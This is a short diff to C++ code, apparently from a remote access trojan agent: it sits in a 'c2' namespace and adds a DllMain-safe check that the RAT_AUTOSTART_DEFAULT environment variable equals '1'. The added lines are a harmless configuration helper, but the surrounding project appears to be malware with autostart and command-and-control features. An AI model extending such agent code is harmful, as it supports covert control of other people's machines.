@@ -673,6 +673,18 @@ namespace c2
         return false;
     }
 
+    // 显式开关：RAT_AUTOSTART_DEFAULT=1（只用 Win32 + 栈缓冲，可在 DllMain 调用）
+    // 严格匹配 "1"：避免 "0"/"false" 之类的值被误当成开启
+    bool agent_autostart_default_enabled()
+    {
+        wchar_t buf[8] = { 0 };
+        DWORD n = GetEnvironmentVariableW(L"RAT_AUTOSTART_DEFAULT", buf,
+            (DWORD)(sizeof(buf) / sizeof(buf[0])));
+        if (n == 0 || n >= sizeof(buf) / sizeof(buf[0]))
+            return false;
+        return buf[0] == L'1' && buf[1] == 0;
+    }
+
     bool agent_signal_stop_by_id_hex(const std::string& hex32)
     {
         if (hex32.size() != 32)
